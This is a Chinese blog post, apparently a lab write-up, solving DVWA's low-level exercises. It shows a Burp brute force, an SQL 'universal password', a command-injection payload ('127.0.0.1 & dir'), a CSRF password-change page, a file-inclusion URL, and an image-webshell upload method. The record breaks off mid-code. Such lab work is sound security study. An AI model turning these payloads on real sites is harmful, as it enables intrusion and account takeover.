@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ka1t4v.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0x01  Brute Force">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA靶场练习">
+<meta property="og:url" content="https://ka1t4v.github.io/2020/02/02/DVWA-low%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="Ka1t4v">
+<meta property="og:description" content="0x01  Brute Force">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208193946517.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208194449547.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208195755107.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208195252716.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208195347980.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208195850198.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208200912994.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210209192030105.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210209192858646.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210209193504154.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210209210530727.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210209211032036.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210209211702476.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214203229227.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214203304800.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214203358024.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214203648854.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214204318147.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214204822795.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214210643271.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214211248771.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214214848195.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214214923698.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214215218198.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/20190507002249798.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214221601379.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214221647311.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214223004305.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214222823064.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214222846321.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214223202800.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214223139643.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214223501051.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214223758168.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223182735729.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223183546686.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223183600444.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223193310818.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223193340425.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223205921151.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224182729674.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223211121290.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224182957097.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224183019365.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224183155070.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224183539921.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224183608654.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224184426194.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224184528292.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224185300140.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224185403335.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224185444851.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224185556703.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224185622995.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224185731482.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224190122046.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224190322082.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224191650414.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224191800340.png">
+<meta property="og:image" content="c:\Users\13378\AppData\Roaming\Typora\typora-user-images\image-20210224192459112.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224192550294.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224192439689.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210227154511763.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210227154552439.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210227154602978.png">
+<meta property="article:published_time" content="2020-02-02T05:23:20.000Z">
+<meta property="article:modified_time" content="2022-08-02T10:54:32.148Z">
+<meta property="article:author" content="Ka1t4v">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208193946517.png">
+
+<link rel="canonical" href="https://ka1t4v.github.io/2020/02/02/DVWA-low%E9%9D%B6%E5%9C%BA/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DVWA靶场练习 | Ka1t4v</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ka1t4v</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ka1t4v.github.io/2020/02/02/DVWA-low%E9%9D%B6%E5%9C%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/config/avatar.jpg">
+      <meta itemprop="name" content="Ka1t4v">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ka1t4v">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA靶场练习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-02-02 13:23:20" itemprop="dateCreated datePublished" datetime="2020-02-02T13:23:20+08:00">2020-02-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="0x01-Brute-Force"><a href="#0x01-Brute-Force" class="headerlink" title="0x01  Brute Force"></a>0x01  Brute Force</h2><span id="more"></span>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208193946517.png" alt="image-20210208193946517"></p>
+<p>可以看到只有一个登录框输入用户名和密码，通过bp抓包来查看一下所发送的数据包</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208194449547.png" alt="image-20210208194449547"></p>
+<p>可以看到用户名和密码都是简单的通过get传参移交给服务器进行验证，并且这里并没有其他的验证信息，可以进行字典爆破，使用bp的intruder模块进行爆破</p>
+<p>这里bp爆破有四个模式：</p>
+<p>Sniper：一次只测试一个位置</p>
+<p>Battering ram：几个位置同时开始测试</p>
+<p>Pitchfork：同时测试每个位置不同的payload</p>
+<p>Cluster bomb：会测试几个payload的不同组合</p>
+<p>因为这里字典是用户名和密码分开的形式，使用cluster bomb模式</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208195755107.png" alt="image-20210208195755107"></p>
+<p>将用户名和密码选中，然后设置对应位置的遍历字典</p>
+<img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208195252716.png" alt="image-20210208195252716"  />
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208195347980.png" alt="image-20210208195347980"></p>
+<p>开始爆破，然后按照不同的长度进行排序</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208195850198.png" alt="image-20210208195850198"></p>
+<p>可以发现只有admin&#x2F;password回显网页不同，猜测为正确的账号密码,使用repeater模块发送账号密码，出现登陆成功的提示</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210208200912994.png" alt="image-20210208200912994"></p>
+<p>源码分析：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里对上传的密码计算md5值，说明数据库中的密码也是通过md5进行存储的，这一手段避免了使用万能密码进行sql注入登录的风险</p>
+<p>万能密码：’ or ‘1’&#x3D;’1</p>
+<h2 id="0x02-Command-Injection"><a href="#0x02-Command-Injection" class="headerlink" title="0x02 Command Injection"></a>0x02 Command Injection</h2><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210209192030105.png" alt="image-20210209192030105"></p>
+<p>这个漏洞的成因是当在命令行执行命令时，可以通过命令组合或管道同时执行多个命令</p>
+<p>此处输入没有任何过滤，所以存在命令执行漏洞</p>
+<p>组合符号：</p>
+<p>&amp; ：同时执行多条命令，不管是否成功</p>
+<p>&amp;&amp;：同时执行多条命令，但碰到出错命令就停止</p>
+<p>||：同时执行多条命令，执行正确的命令后将不再执行后面的命令</p>
+<p>管道命令：</p>
+<p>|：将第一条命令的结果作为第二条命令的参数来使用</p>
+<p>payload: [VMware Workstation Pro.lnk](....\Public\Desktop\VMware Workstation Pro.lnk) </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; dir</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210209192858646.png" alt="image-20210209192858646"></p>
+<h2 id="0x03-Cross-Site-Request-Forgery-CSRF"><a href="#0x03-Cross-Site-Request-Forgery-CSRF" class="headerlink" title="0x03 Cross Site Request Forgery (CSRF)"></a>0x03 Cross Site Request Forgery (CSRF)</h2><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210209193504154.png" alt="image-20210209193504154"></p>
+<p>CSRF，全称Cross-site request  forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
+<p>进行改密操作用bp抓包</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210209210530727.png" alt="image-20210209210530727"></p>
+<p>这里并没有任何验证的参数，仅利用了客户端的cookie信息进行验证，改密方式使用get传参，所以考虑可以使用伪造改密链接诱骗受害人点击payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span><br></pre></td></tr></table></figure>
+
+<p>可以将这个点击链接的事件嵌入到网页中，在受害人不之情的情况下进行改密攻击</p>
+<p>伪造页面代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &#x27;CSRF test&#x27;	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用当前浏览器访问伪造好的页面</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210209211032036.png" alt="image-20210209211032036"></p>
+<p>并没有显示任何其他的信息，然而此时改密操作已经完成</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210209211702476.png" alt="image-20210209211702476"></p>
+<p>由于是利用了窃取cookie进行csrf攻击，所以必须是用一个浏览器访问诱导页面才能够完成改密操作</p>
+<h2 id="0x04-File-Inclusion"><a href="#0x04-File-Inclusion" class="headerlink" title="0x04 File Inclusion"></a>0x04 File Inclusion</h2><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214203229227.png" alt="image-20210214203229227"></p>
+<p>文件包含漏洞就是对于include某网页时，对于输入的参数并没有进行过滤，而使得可以访问任意网站文件</p>
+<p>点击任一网页</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214203304800.png" alt="image-20210214203304800"></p>
+<p>发现是通过get传参，修改参数重新访问</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214203358024.png" alt="image-20210214203358024"></p>
+<p>可以看到目录并没有flag.php文件所以报错，但是同样也证明了存在文件包含，因为传入的参数被解析并执行了，并且也爆出了网站当前目录</p>
+<p>同样也可以用bp抓包修改get传递的参数</p>
+<h2 id="0x05-File-Upload"><a href="#0x05-File-Upload" class="headerlink" title="0x05 File Upload"></a>0x05 File Upload</h2><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214203648854.png" alt="image-20210214203648854"></p>
+<p>文件上传漏洞就是对上传的图片文件并没有进行过滤，导致可以通过上传一句话木马或图片马的方式进行getshell，文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。</p>
+<p>经典的php一句话木马</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214204318147.png" alt="image-20210214204318147"></p>
+<p>low等级可以成功直接上传one.php说明无任何过滤</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214204822795.png" alt="image-20210214204822795"></p>
+<p>然后进行菜刀连接</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214210643271.png" alt="image-20210214210643271"></p>
+<p>成功读取后台文件</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214211248771.png" alt="image-20210214211248771"></p>
+<p>同样可以使用上传图片马的方法，首先生成图片马，将想要执行的php命令添加到图片后面即可形成图片马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy real.png/b + info.php/a 2.jpg</span><br></pre></td></tr></table></figure>
+
+<p>之后将图片马进行上传</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214214848195.png" alt="image-20210214214848195"></p>
+<p>此时由于上传的文件名为2.jpg，无法直接执行，需要结合文件包含漏洞，因为当文件包含时，不管是什么文件类型，都会执行其中的代码</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=http://127.0.0.1/DVWA-master/hackable/uploads/2.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214214923698.png" alt="image-20210214214923698"></p>
+<p>成功执行图片马中的phpinfo();命令</p>
+<h2 id="0x06-Insecure-CAPTCHA"><a href="#0x06-Insecure-CAPTCHA" class="headerlink" title="0x06 Insecure CAPTCHA"></a>0x06 Insecure CAPTCHA</h2><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214215218198.png" alt="image-20210214215218198"></p>
+<p>不安全的验证码，主要是利用了与服务器交互中的逻辑漏洞</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/20190507002249798.png" alt="1"></p>
+<p>这是网上找到的验证流程图</p>
+<p>然后查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> 